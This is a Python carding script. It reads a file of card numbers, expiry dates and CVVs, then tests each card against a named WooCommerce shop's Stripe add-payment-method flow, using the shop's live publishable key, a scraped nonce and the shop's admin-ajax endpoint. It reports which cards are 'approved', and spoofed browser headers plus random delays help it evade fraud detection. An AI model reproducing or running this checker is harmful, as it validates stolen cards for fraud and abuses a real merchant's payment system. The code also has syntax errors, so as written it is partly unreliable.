import aiohttp
import asyncio
import json
import random

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

async def make_request(
    session,
    url,
    method="POST",
    params=None,
    headers=None,
    data=None,
    json_data=None,
):
    try:
        async with session.request(
            method,
            url,
            params=params,
            headers=headers,
            data=data,
            json=json_data,
        ) as response:
            return await response.text(), response.status
    except Exception as e:
        return None, 0

async def ppc(cards, card_num, total_cards):
    cc, mon, year, cvv = cards.split("|")
    year = year[-2:]
    cc = cc.replace(" ", "")

    cookies = {
}


    connector = aiohttp.TCPConnector(limit=100, ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)
    
    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        cookies=cookies
    ) as session:

        # Step 1: Get the payment method page
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9,nl;q=0.8,ar;q=0.7",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "priority": "u=0, i",
            "sec-ch-ua": '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
        }

        req, status = await make_request(
            session,
            url=f"https://dainte.com/my-account/add-payment-method/",
            method="GET",
            headers=headers,
        )
        
        if req is None:
            return f"❌ [{card_num}/{total_cards}] Failed to get payment method page"
        
        setup_intent_nonce = parseX(req, '"createAndConfirmSetupIntentNonce":"', '"')
        if setup_intent_nonce == "None":
            return f"❌ [{card_num}/{total_cards}] No setup intent nonce found"

        await asyncio.sleep(random.uniform(2, 4))

        # Step 2: Create payment method with Stripe
        headers2 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
        }

        data2 = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": year,
            "card[exp_month]": mon,
            "allow_redisplay": "unspecified",
            "billing_details[address][postal_code]": "99501",
            "billing_details[address][country]": "US",
            "billing_details[name]": "Test User",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent",
            "referrer": "https://dainte.com",
            "time_on_page": "187650",
            "key": PK,
            "_stripe_version": "2024-06-20",
        }

        req2, status2 = await make_request(
            session,
            "https://api.stripe.com/v1/payment_methods",
            headers=headers2,
            data=data2,
        )
        
        if req2 is None:
            return f"❌ [{card_num}/{total_cards}] Failed to create payment method"
            
        try:
            pm_data = json.loads(req2)
            if 'error' in pm_data:
                return f"❌ [{card_num}/{total_cards}] Stripe error: {pm_data['error']['message']}"
            pmid = pm_data.get('id')
            if not pmid:
                return f"❌ [{card_num}/{total_cards}] No payment method ID"
        except json.JSONDecodeError:
            return f"❌ [{card_num}/{total_cards}] Invalid JSON response from Stripe"

        await asyncio.sleep(random.uniform(1, 2))

        # Step 3: Send to WooCommerce admin-ajax.php
        headers3 = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9,nl;q=0.8,ar;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": https://dainte.com,
            "referer": f"https://dainte.com/my-account/add-payment-method/",
            "sec-ch-ua": '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }

        data3 = {
            "action": "wc_stripe_create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pmid,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": setup_intent_nonce,
        }

        req3, status3 = await make_request(
            session,
            url=f"https://dainte.com/wp-admin/admin-ajax.php",
            headers=headers3,
            data=data3,
        )
        
        if req3:
            try:
                result_data = json.loads(req3)
                if result_data.get('success'):
                    return f"✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥 [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}"
                else:
                    # Extract error message from JSON response
                    error_msg = "Unknown error"
                    try:
                        if 'data' in result_data and 'error' in result_data['data']:
                            error_msg = result_data['data']['error']['message']
                        elif 'message' in result_data:
                            error_msg = result_data['message']
                    except:
                        error_msg = str(result_data)
                    
                    return f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌ [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}\n𝗘𝗿𝗿𝗼𝗿: {error_msg}"
            except json.JSONDecodeError:
                return f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌ [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {req3}"
        
        return f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌ [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}\n𝗡𝗼 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗲 𝗳𝗿𝗼𝗺 𝘀𝗲𝗿𝘃𝗲𝗿"

async def main():
    try:
        file_path = input("Enter the path to your CC combo file: ")
        with open(file_path, "r") as file:
            cards = [line.strip() for line in file if line.strip()]
            total_cards = len(cards)
            
            print(f"🚀 Starting check for {total_cards} cards...")
            print("=" * 50)
            
            approved_count = 0
            declined_count = 0
            
            for i, card in enumerate(cards, 1):
                result = await ppc(card, i, total_cards)
                print(result)
                
                # Count results
                if "✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥" in result:
                    approved_count += 1
                else:
                    declined_count += 1
                
                # Show progress summary
                print(f"📊 Progress: ✅ {approved_count} | ❌ {declined_count} | Total: {i}/{total_cards}")
                print("-" * 40)
                
                # Add longer delay between cards
                if i < total_cards:
                    delay = random.uniform(10, 15)
                    print(f"⏳ Waiting {delay:.1f} seconds before next card...\n")
                    await asyncio.sleep(delay)
            
            # Final summary
            print("=" * 50)
            print(f"🎯 CHECK COMPLETED!")
            print(f"✅ ᴀᴘᴘʀᴏᴠᴇᴅ: {approved_count} 🔥")
            print(f"❌ ᴅᴇᴄʟɪɴᴇᴅ: {declined_count}")
            print(f"📊 Success Rate: {(approved_count/total_cards)*100:.1f}%")
            print("=" * 50)
                    
    except Exception as e:
        print(f"❌ Error: {e}")

  
    asyncio.run(main())
if __name__ == "__main__":
    DOMAIN = "https://dainte.com"
    PK = "pk_live_51F0CDkINGBagf8ROVbhXA43bHPn9cGEHEO55TN2mfNGYsbv2DAPuv6K0LoVywNJKNuzFZ4xGw94nVElyYg1Aniaf00QDrdzPhf"

    asyncio.run(main())
